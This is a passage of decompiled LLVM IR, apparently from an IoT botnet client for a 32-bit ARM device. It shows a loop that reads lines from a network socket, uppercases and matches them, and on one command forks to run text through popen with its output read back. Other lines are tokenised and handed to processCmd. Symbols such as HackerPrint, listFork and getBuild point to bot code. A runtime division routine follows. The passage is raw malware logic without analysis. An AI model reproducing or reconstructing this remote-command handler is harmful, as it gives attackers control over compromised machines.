  %v1_13790 = add i32 %v3_1377c, %v2_1378c
  %v5_13794 = inttoptr i32 %v1_13790 to i8*
  %v2_137dc = add i32 %v1_13790, -1
  br label %dec_label_pc_137c4

dec_label_pc_1379c:                               ; preds = %dec_label_pc_137f0, %dec_label_pc_137c4
  %v3_137a4 = call i32 @strlen(i8* %v5_13794)
  %v1_137b8 = add i32 %v2_137dc, %v3_137a4
  %v3_137c0 = inttoptr i32 %v1_137b8 to i8*
  store i8 0, i8* %v3_137c0, align 1
  br label %dec_label_pc_137c4

dec_label_pc_137c4:                               ; preds = %dec_label_pc_1375c, %dec_label_pc_1379c
  %v3_137cc = call i32 @strlen(i8* %v5_13794)
  %v1_137e0 = add i32 %v3_137cc, %v2_137dc
  %v1_137e4 = inttoptr i32 %v1_137e0 to i8*
  %v2_137e4 = load i8, i8* %v1_137e4, align 1
  %v7_137e8 = icmp eq i8 %v2_137e4, 10
  br i1 %v7_137e8, label %dec_label_pc_1379c, label %dec_label_pc_137f0

dec_label_pc_137f0:                               ; preds = %dec_label_pc_137c4
  %v3_137f8 = call i32 @strlen(i8* %v5_13794)
  %v1_1380c = add i32 %v3_137f8, %v2_137dc
  %v1_13810 = inttoptr i32 %v1_1380c to i8*
  %v2_13810 = load i8, i8* %v1_13810, align 1
  %v7_13814 = icmp eq i8 %v2_13810, 13
  br i1 %v7_13814, label %dec_label_pc_1379c, label %dec_label_pc_1381c

dec_label_pc_1381c:                               ; preds = %dec_label_pc_137f0
  %v2_1383821 = load i8, i8* %v5_13794, align 1
  %v7_1383c25 = icmp eq i8 %v2_1383821, 32
  br i1 %v7_1383c25, label %dec_label_pc_13854, label %dec_label_pc_13844

dec_label_pc_13828:                               ; preds = %dec_label_pc_13844
  %v1_1382c = add i32 %v4_1383427, 1
  %v5_13830 = inttoptr i32 %v1_1382c to i8*
  %v2_13838 = load i8, i8* %v5_13830, align 1
  %v7_1383c = icmp eq i8 %v2_13838, 32
  br i1 %v7_1383c, label %dec_label_pc_13854, label %dec_label_pc_13844

dec_label_pc_13844:                               ; preds = %dec_label_pc_1381c, %dec_label_pc_13828
  %v4_1383427 = phi i32 [ %v1_1382c, %dec_label_pc_13828 ], [ %v1_13790, %dec_label_pc_1381c ]
  %stack_var_-64.026 = phi i8* [ %v5_13830, %dec_label_pc_13828 ], [ %v5_13794, %dec_label_pc_1381c ]
  %v2_13848 = load i8, i8* %stack_var_-64.026, align 1
  %v2_1384c = icmp eq i8 %v2_13848, 0
  br i1 %v2_1384c, label %dec_label_pc_13854, label %dec_label_pc_13828

dec_label_pc_13854:                               ; preds = %dec_label_pc_13828, %dec_label_pc_13844, %dec_label_pc_1381c
  %stack_var_-64.0.lcssa = phi i8* [ %v5_13794, %dec_label_pc_1381c ], [ %v5_13830, %dec_label_pc_13828 ], [ %stack_var_-64.026, %dec_label_pc_13844 ]
  %v4_13834.lcssa = phi i32 [ %v1_13790, %dec_label_pc_1381c ], [ %v1_1382c, %dec_label_pc_13828 ], [ %v4_1383427, %dec_label_pc_13844 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_13864 = add i32 %v4_13834.lcssa, 1
  %v2_138a832 = load i8, i8* %v5_13794, align 1
  %v2_138ac34 = icmp eq i8 %v2_138a832, 0
  br i1 %v2_138ac34, label %dec_label_pc_138b4, label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %dec_label_pc_13854, %dec_label_pc_13878
  %storemerge736 = phi i8* [ %storemerge7, %dec_label_pc_13878 ], [ %v5_13794, %dec_label_pc_13854 ]
  %storemerge1635 = phi i32 [ %v1_1389c, %dec_label_pc_13878 ], [ %v1_13790, %dec_label_pc_13854 ]
  %v2_1387c = load i8, i8* %storemerge736, align 1
  %v3_1387c = zext i8 %v2_1387c to i32
  %v1_13884 = call i32 @__GI_toupper(i32 %v3_1387c)
  %v1_13894 = trunc i32 %v1_13884 to i8
  store i8 %v1_13894, i8* %storemerge736, align 1
  %v1_1389c = add i32 %storemerge1635, 1
  %storemerge7 = inttoptr i32 %v1_1389c to i8*
  %v2_138a8 = load i8, i8* %storemerge7, align 1
  %v2_138ac = icmp eq i8 %v2_138a8, 0
  br i1 %v2_138ac, label %dec_label_pc_138b4, label %dec_label_pc_13878

dec_label_pc_138b4:                               ; preds = %dec_label_pc_13878, %dec_label_pc_13854
  store i32 ptrtoint ([5 x i8]* @global_var_1eff8.865 to i32), i32* @r1, align 4
  %v4_138c0 = call i32 @__GI_strcoll(i8* %v5_13794, i32 ptrtoint ([5 x i8]* @global_var_1eff8.865 to i32))
  %v2_138c8 = icmp eq i32 %v4_138c0, 0
  br i1 %v2_138c8, label %dec_label_pc_138d0, label %dec_label_pc_139b4

dec_label_pc_138d0:                               ; preds = %dec_label_pc_138b4
  %v0_138d0 = call i32 @listFork()
  %v2_138d8 = icmp eq i32 %v0_138d0, 0
  br i1 %v2_138d8, label %dec_label_pc_138e0, label %dec_label_pc_13b3c

dec_label_pc_138e0:                               ; preds = %dec_label_pc_138d0
  store i32 1024, i32* @r2, align 4
  %v3_138f8 = call i32 @__GI_memset(i8* %v2_138f8, i32 0)
  %v6_13918 = call i32 @szprintf(i32 %v2_138e8, i32 ptrtoint ([8 x i8]* @global_var_1f000.867 to i32), i32 %v1_13864, i32 %v2_138e8, i32 ptrtoint (i32* @0 to i32))
  %v3_13934 = call i32 @fdpopen(i32 %v2_138e8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1f008.869, i32 0, i32 0))
  br label %dec_label_pc_1397c

dec_label_pc_13944:                               ; preds = %dec_label_pc_1397c
  %v2_13954 = call i32 @trim(i8* %v2_138f8)
  store i32 1024, i32* @r2, align 4
  %v3_13970 = call i32 @__GI_memset(i8* %v2_138f8, i32 0)
  %v1_13978 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1397c

dec_label_pc_1397c:                               ; preds = %dec_label_pc_138e0, %dec_label_pc_13944
  %v4_13994 = call i32 @fdgets(i32 %v2_138e8, i32 1024, i32 %v3_13934, i32 %v2_138e8)
  %v2_1399c = icmp eq i32 %v4_13994, 0
  br i1 %v2_1399c, label %dec_label_pc_139a4, label %dec_label_pc_13944

dec_label_pc_139a4:                               ; preds = %dec_label_pc_1397c
  %v1_139a8 = call i32 @fdpclose(i32 %v3_13934)
  %v1_139b0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_139b4

dec_label_pc_139b4:                               ; preds = %dec_label_pc_138b4, %dec_label_pc_139a4
  store i32 %v1_13864, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f00c.871 to i32), i32* @r1, align 4
  %v2_139c8 = call i32 @__GI_strtok(i32 %v1_13864, i32 ptrtoint (i32* @global_var_1f00c.871 to i32))
  store i32 %v1_13790, i32* %stack_var_-132, align 4
  %v2_13ac439 = icmp eq i32 %v2_139c8, 0
  br i1 %v2_13ac439, label %dec_label_pc_13acc, label %dec_label_pc_139e0

dec_label_pc_139e0:                               ; preds = %dec_label_pc_139b4, %dec_label_pc_13aac
  %stack_var_-36.042.in = phi i32 [ %v2_13ab4, %dec_label_pc_13aac ], [ %v2_139c8, %dec_label_pc_139b4 ]
  %stack_var_-40.140 = phi i32 [ %stack_var_-40.0, %dec_label_pc_13aac ], [ 1, %dec_label_pc_139b4 ]
  %stack_var_-36.042 = inttoptr i32 %stack_var_-36.042.in to i8*
  %v2_139e4 = load i8, i8* %stack_var_-36.042, align 1
  %v7_139e8 = icmp eq i8 %v2_139e4, 10
  br i1 %v7_139e8, label %dec_label_pc_13aac, label %dec_label_pc_139f0

dec_label_pc_139f0:                               ; preds = %dec_label_pc_139e0
  store i32 %stack_var_-40.140, i32* @r4, align 4
  %v3_139fc = call i32 @strlen(i8* nonnull %stack_var_-36.042)
  %v1_13a04 = add i32 %v3_139fc, 1
  %v1_13a0c = call i32 @malloc(i32 %v1_13a04)
  %v0_13a1c = load i32, i32* @r4, align 4
  %v3_13a1c = mul i32 %v0_13a1c, 4
  %v2_13a28 = add i32 %v2_13b0c, %v3_13a1c
  %v2_13a2c = inttoptr i32 %v2_13a28 to i32*
  store i32 %v1_13a0c, i32* %v2_13a2c, align 4
  %v3_13a38 = mul i32 %stack_var_-40.140, 4
  %v2_13a44 = add i32 %v2_13b0c, %v3_13a38
  %v1_13a48 = inttoptr i32 %v2_13a44 to i32*
  %v2_13a48 = load i32, i32* %v1_13a48, align 4
  store i32 %v2_13a48, i32* @r4, align 4
  %v3_13a54 = call i32 @strlen(i8* nonnull %stack_var_-36.042)
  %v1_13a5c = add i32 %v3_13a54, 1
  %v0_13a60 = load i32, i32* @r4, align 4
  store i32 %v1_13a5c, i32* @r2, align 4
  %v2_13a70 = inttoptr i32 %v0_13a60 to i8*
  %v3_13a70 = call i32 @__GI_memset(i8* %v2_13a70, i32 0)
  %v2_13a8c = load i32, i32* %v1_13a48, align 4
  %v4_13a9c = call i32 @strcpy(i32 %v2_13a8c, i8* nonnull %stack_var_-36.042)
  %v1_13aa4 = add i32 %stack_var_-40.140, 1
  br label %dec_label_pc_13aac

dec_label_pc_13aac:                               ; preds = %dec_label_pc_139e0, %dec_label_pc_139f0
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.140, %dec_label_pc_139e0 ], [ %v1_13aa4, %dec_label_pc_139f0 ]
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f00c.871 to i32), i32* @r1, align 4
  %v2_13ab4 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f00c.871 to i32))
  %v2_13ac4 = icmp eq i32 %v2_13ab4, 0
  br i1 %v2_13ac4, label %dec_label_pc_13acc, label %dec_label_pc_139e0

dec_label_pc_13acc:                               ; preds = %dec_label_pc_13aac, %dec_label_pc_139b4
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_139b4 ], [ %stack_var_-40.0, %dec_label_pc_13aac ]
  %v3_13ad8 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-132)
  %v7_13ae4 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_13ae4, label %dec_label_pc_13b3c, label %dec_label_pc_13afc.lr.ph

dec_label_pc_13afc.lr.ph:                         ; preds = %dec_label_pc_13acc
  br label %dec_label_pc_13afc

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13afc.lr.ph, %dec_label_pc_13afc
  %storemerge17104 = phi i32 [ 1, %dec_label_pc_13afc.lr.ph ], [ %v1_13b24, %dec_label_pc_13afc ]
  %v3_13b04 = mul i32 %storemerge17104, 4
  %v2_13b10 = add i32 %v2_13b0c, %v3_13b04
  %v1_13b14 = inttoptr i32 %v2_13b10 to i32*
  %v2_13b14 = load i32, i32* %v1_13b14, align 4
  %v1_13b1c = call i32 @free(i32 %v2_13b14)
  %v1_13b24 = add nuw nsw i32 %storemerge17104, 1
  %v5_13b38 = icmp slt i32 %v1_13b24, %stack_var_-40.1.lcssa
  br i1 %v5_13b38, label %dec_label_pc_13afc, label %dec_label_pc_13b3c

dec_label_pc_13b3c:                               ; preds = %dec_label_pc_13afc, %dec_label_pc_138d0, %dec_label_pc_136f0, %dec_label_pc_13acc, %dec_label_pc_1374c, %dec_label_pc_136a0, %dec_label_pc_13310
  %v2_13b40 = load i32, i32* @global_var_28c44.54, align 4
  %v5_13b5c = call i32 @recvLine(i32 %v2_13b40, i8* %v4_13b5c, i32 4096, i32 %v2_13b4c)
  %v3_13b6c = icmp eq i32 %v5_13b5c, -1
  br i1 %v3_13b6c, label %dec_label_pc_132f4, label %dec_label_pc_135c8

; uselistorder directives
  uselistorder i32 %v5_13b5c, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_13ab4, { 1, 0 }
  uselistorder i8* %stack_var_-36.042, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.140, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_1389c, { 1, 0 }
  uselistorder i8* %storemerge736, { 1, 0 }
  uselistorder i32 %v1_13864, { 1, 2, 0 }
  uselistorder i32 %v2_137dc, { 1, 2, 0 }
  uselistorder i8* %v5_13794, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_13790, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_13604, { 1, 0 }
  uselistorder i32 %v3_135d0, { 1, 0 }
  uselistorder i32 %storemerge14, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_134f0, { 1, 0 }
  uselistorder i32 %v1_134d4, { 1, 0 }
  uselistorder i32 %v1_133a8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_13b0c, { 2, 0, 1 }
  uselistorder i32 %v2_138e8, { 2, 3, 4, 1, 0 }
  uselistorder i8* %v4_13b5c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_13b4c, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 19, 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1f00c.871 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 2, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 0, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @listFork, { 0, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*)* @strstr, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32* @global_var_28c48.60, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2eec8.63, { 0, 2, 3, 4, 5, 6, 7, 1, 10, 8, 9 }
  uselistorder i32 (i32, i32)* @HackerPrint, { 2, 1, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 17, 16, 0 }
  uselistorder i32* @global_var_28c44.54, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 (i32)* @sleep, { 1, 0, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @srand, { 1, 2, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 24, 25, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 3, 4, 5, 6, 26, 27 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 2, 4, 3, 1, 0 }
  uselistorder i32* @global_var_2eebc.478, { 0, 1, 4, 2, 3 }
  uselistorder i32 ()* @getBuild, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b3c, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_13afc, { 1, 0 }
  uselistorder label %dec_label_pc_13aac, { 1, 0 }
  uselistorder label %dec_label_pc_139e0, { 1, 0 }
  uselistorder label %dec_label_pc_139b4, { 1, 0 }
  uselistorder label %dec_label_pc_1397c, { 1, 0 }
  uselistorder label %dec_label_pc_13878, { 1, 0 }
  uselistorder label %dec_label_pc_13854, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13844, { 1, 0 }
  uselistorder label %dec_label_pc_137c4, { 1, 0 }
  uselistorder label %dec_label_pc_1372c, { 1, 0 }
  uselistorder label %dec_label_pc_136f0, { 1, 0 }
  uselistorder label %dec_label_pc_1363c, { 1, 0 }
  uselistorder label %dec_label_pc_135bc, { 1, 0 }
  uselistorder label %dec_label_pc_1352c, { 1, 0 }
  uselistorder label %dec_label_pc_134ec, { 1, 0 }
  uselistorder label %dec_label_pc_133fc, { 1, 0 }
  uselistorder label %dec_label_pc_133b4, { 1, 0 }
  uselistorder label %dec_label_pc_132f4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_132d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13174, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_13bc8 = add i32 %arg2, -1
  %v7_13bc8 = icmp eq i32 %arg2, 1
  br i1 %v7_13bc8, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_13bcc = load i32, i32* @r0, align 4
  ret i32 %v2_13bcc

bb80:                                             ; preds = %entry
  %v2_13bc8 = icmp eq i32 %arg2, 0
  br i1 %v2_13bc8, label %dec_label_pc_13cb0, label %dec_label_pc_13bd4

dec_label_pc_13bd4:                               ; preds = %bb80
  %v0_13bd4 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_13bd4, %arg2
  br i1 %tmp, label %dec_label_pc_13bdc, label %dec_label_pc_13c68

dec_label_pc_13bdc:                               ; preds = %dec_label_pc_13bd4
  %v2_13bdc = and i32 %v1_13bc8, %arg2
  %v4_13bdc = icmp eq i32 %v2_13bdc, 0
  br i1 %v4_13bdc, label %dec_label_pc_13c74, label %dec_label_pc_13be4

dec_label_pc_13be4:                               ; preds = %dec_label_pc_13bdc
  %v3_13be4 = icmp ult i32 %arg2, 536870912
  br i1 %v3_13be4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_13be4
  %v4_13be8 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_13be4, %.thread
  %v0_13c08.pr36.ph = phi i32 [ %v4_13be8, %.thread ], [ %arg2, %dec_label_pc_13be4 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_13be4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_13c08.pr36 = phi i32 [ %v4_13bfc, %bb83 ], [ %v0_13c08.pr36.ph, %.preheader.preheader ]
  %v1_13c00 = phi i32 [ %v4_13c00, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_13bf4 = icmp ugt i32 %v0_13c08.pr36, 268435455
  br i1 %v2_13bf4, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_13c08thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_13bf8 = icmp ult i32 %v0_13c08.pr36, %v0_13bd4
  br i1 %v4_13bf8, label %bb82, label %dec_label_pc_13c08thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_13bfc = and i32 %v0_13c08.pr36, 268435456
  %v3_13bfc = icmp eq i32 %v2_13bfc, 0
  %v4_13bfc = mul i32 %v0_13c08.pr36, 16
  br i1 %v3_13bfc, label %bb83, label %dec_label_pc_13c08.loopexit

bb83:                                             ; preds = %bb82
  %v2_13c00 = and i32 %v1_13c00, 268435456
  %v3_13c00 = icmp eq i32 %v2_13c00, 0
  %v4_13c00 = mul i32 %v1_13c00, 16
  br i1 %v3_13c00, label %.preheader, label %dec_label_pc_13c08thread-pre-split.loopexit.loopexit

dec_label_pc_13c08thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_13c1448.ph = phi i32 [ %v1_13c00, %bb81 ], [ %v4_13c00, %bb83 ]
  %v0_13c08.pr38.ph = phi i32 [ %v0_13c08.pr36, %bb81 ], [ %v4_13bfc, %bb83 ]
  br label %dec_label_pc_13c08thread-pre-split.loopexit

dec_label_pc_13c08thread-pre-split.loopexit:      ; preds = %dec_label_pc_13c08thread-pre-split.loopexit.loopexit, %.thread2
  %v1_13c1448 = phi i32 [ %v1_13c00, %.thread2 ], [ %v1_13c1448.ph, %dec_label_pc_13c08thread-pre-split.loopexit.loopexit ]
  %v0_13c08.pr38 = phi i32 [ %v0_13c08.pr36, %.thread2 ], [ %v0_13c08.pr38.ph, %dec_label_pc_13c08thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_13c08thread-pre-split

dec_label_pc_13c08thread-pre-split:               ; preds = %dec_label_pc_13c08thread-pre-split.loopexit, %bb85
  %v1_13c1446 = phi i32 [ %v1_13c1448, %dec_label_pc_13c08thread-pre-split.loopexit ], [ %v3_13c14, %bb85 ]
  %v0_13c08.pr = phi i32 [ %v0_13c08.pr38, %dec_label_pc_13c08thread-pre-split.loopexit ], [ %v3_13c10, %bb85 ]
  br label %dec_label_pc_13c08

dec_label_pc_13c08.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_13c08

dec_label_pc_13c08:                               ; preds = %dec_label_pc_13c08.loopexit, %dec_label_pc_13c08thread-pre-split
  %v1_13c14 = phi i32 [ %v1_13c1446, %dec_label_pc_13c08thread-pre-split ], [ %v1_13c00, %dec_label_pc_13c08.loopexit ]
  %v1_13c10 = phi i32 [ %v0_13c08.pr, %dec_label_pc_13c08thread-pre-split ], [ %v4_13bfc, %dec_label_pc_13c08.loopexit ]
  %v2_13c08 = icmp slt i32 %v1_13c10, 0
  br i1 %v2_13c08, label %dec_label_pc_13c1c, label %bb84

bb84:                                             ; preds = %dec_label_pc_13c08
  %v4_13c0c = icmp ult i32 %v1_13c10, %v0_13bd4
  br i1 %v4_13c0c, label %bb85, label %dec_label_pc_13c1c

bb85:                                             ; preds = %bb84
  %v3_13c10 = mul i32 %v1_13c10, 2
  %v2_13c14 = icmp slt i32 %v1_13c14, 0
  %v3_13c14 = mul i32 %v1_13c14, 2
  br i1 %v2_13c14, label %dec_label_pc_13c1c, label %dec_label_pc_13c08thread-pre-split

dec_label_pc_13c1c:                               ; preds = %bb84, %dec_label_pc_13c08, %bb85
  %v2_13c2859 = phi i32 [ %v3_13c14, %bb85 ], [ %v1_13c14, %bb84 ], [ %v1_13c14, %dec_label_pc_13c08 ]
  %v1_13c2051 = phi i32 [ %v3_13c10, %bb85 ], [ %v1_13c10, %bb84 ], [ %v1_13c10, %dec_label_pc_13c08 ]
  br label %dec_label_pc_13c20

dec_label_pc_13c20:                               ; preds = %.thread11, %dec_label_pc_13c1c
  %v1_13c54 = phi i32 [ %v4_13c54, %.thread11 ], [ %v2_13c2859, %dec_label_pc_13c1c ]
  %v1_13c28 = phi i32 [ %v0_13c60, %.thread11 ], [ 0, %dec_label_pc_13c1c ]
  %v1_13c58 = phi i32 [ %v4_13c58, %.thread11 ], [ %v1_13c2051, %dec_label_pc_13c1c ]
  %v1_13c24 = phi i32 [ %v0_13c50, %.thread11 ], [ %v0_13bd4, %dec_label_pc_13c1c ]
  %v3_13c20 = icmp ult i32 %v1_13c24, %v1_13c58
  br i1 %v3_13c20, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_13c20
  %v3_13c24 = sub i32 %v1_13c24, %v1_13c58
  %v3_13c28 = or i32 %v1_13c28, %v1_13c54
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13c20, %bb86
  %v1_13c30 = phi i32 [ %v1_13c24, %dec_label_pc_13c20 ], [ %v3_13c24, %bb86 ]
  %v1_13c34 = phi i32 [ %v1_13c28, %dec_label_pc_13c20 ], [ %v3_13c28, %bb86 ]
  %v4_13c2c = udiv i32 %v1_13c58, 2
  %v6_13c2c = icmp ult i32 %v1_13c30, %v4_13c2c
  br i1 %v6_13c2c, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_13c30 = urem i32 %v1_13c58, 2
  %v4_13c30 = icmp eq i32 %v3_13c30, 0
  %v6_13c30 = sub i32 %v1_13c30, %v4_13c2c
  br i1 %v4_13c30, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_13c34 = udiv i32 %v1_13c54, 2
  %v6_13c34 = or i32 %v1_13c34, %v5_13c34
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_13c3c = phi i32 [ %v6_13c30, %bb87 ], [ %v1_13c30, %.thread7 ], [ %v6_13c30, %bb88 ]
  %v1_13c40 = phi i32 [ %v1_13c34, %bb87 ], [ %v1_13c34, %.thread7 ], [ %v6_13c34, %bb88 ]
  %v4_13c38 = udiv i32 %v1_13c58, 4
  %v6_13c38 = icmp ult i32 %v1_13c3c, %v4_13c38
  br i1 %v6_13c38, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_13c3c = and i32 %v1_13c58, 2
  %v4_13c3c = icmp eq i32 %v3_13c3c, 0
  %v6_13c3c = sub i32 %v1_13c3c, %v4_13c38
  br i1 %v4_13c3c, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_13c40 = udiv i32 %v1_13c54, 4
  %v6_13c40 = or i32 %v1_13c40, %v5_13c40
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_13c48 = phi i32 [ %v6_13c3c, %bb89 ], [ %v1_13c3c, %.thread8 ], [ %v6_13c3c, %bb90 ]
  %v1_13c4c = phi i32 [ %v1_13c40, %bb89 ], [ %v1_13c40, %.thread8 ], [ %v6_13c40, %bb90 ]
  %v4_13c44 = udiv i32 %v1_13c58, 8
  %v6_13c44 = icmp ult i32 %v1_13c48, %v4_13c44
  br i1 %v6_13c44, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_13c48 = and i32 %v1_13c58, 4
  %v4_13c48 = icmp eq i32 %v3_13c48, 0
  %v6_13c48 = sub i32 %v1_13c48, %v4_13c44
  br i1 %v4_13c48, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_13c4c = udiv i32 %v1_13c54, 8
  %v6_13c4c = or i32 %v1_13c4c, %v5_13c4c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_13c60 = phi i32 [ %v1_13c4c, %bb91 ], [ %v1_13c4c, %.thread9 ], [ %v6_13c4c, %bb92 ]
  %v0_13c50 = phi i32 [ %v6_13c48, %bb91 ], [ %v1_13c48, %.thread9 ], [ %v6_13c48, %bb92 ]
  %v2_13c50 = icmp eq i32 %v0_13c50, 0
  br i1 %v2_13c50, label %dec_label_pc_13c60, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_13c54, 16
  br i1 %tmp140, label %dec_label_pc_13c60, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_13c54 = udiv i32 %v1_13c54, 16
  %v4_13c58 = udiv i32 %v1_13c58, 16
  br label %dec_label_pc_13c20

dec_label_pc_13c60:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_13c60

dec_label_pc_13c68:                               ; preds = %dec_label_pc_13bd4
  %v9_13bd4 = icmp eq i32 %v0_13bd4, %arg2
  %. = zext i1 %v9_13bd4 to i32
  ret i32 %.

dec_label_pc_13c74:                               ; preds = %dec_label_pc_13bdc
  %v2_13c74 = icmp ugt i32 %arg2, 65535
  br i1 %v2_13c74, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_13c74
  %v2_13c78 = and i32 %arg2, 32768
  %v3_13c78 = icmp eq i32 %v2_13c78, 0
  %v4_13c78 = udiv i32 %arg2, 65536
  br i1 %v3_13c78, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_13c74
  %v0_13c8465 = phi i32 [ %arg2, %dec_label_pc_13c74 ], [ %v4_13c78, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_13c88 = phi i32 [ %v0_13c8465, %.thread16 ], [ %v4_13c78, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_13c84 = icmp ugt i32 %v1_13c88, 255
  br i1 %v2_13c84, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_13c88 = and i32 %v1_13c88, 128
  %v3_13c88 = icmp eq i32 %v2_13c88, 0
  %v4_13c88 = udiv i32 %v1_13c88, 256
  br i1 %v3_13c88, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_13c8c = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_13c98 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_13c8c, %bb100 ]
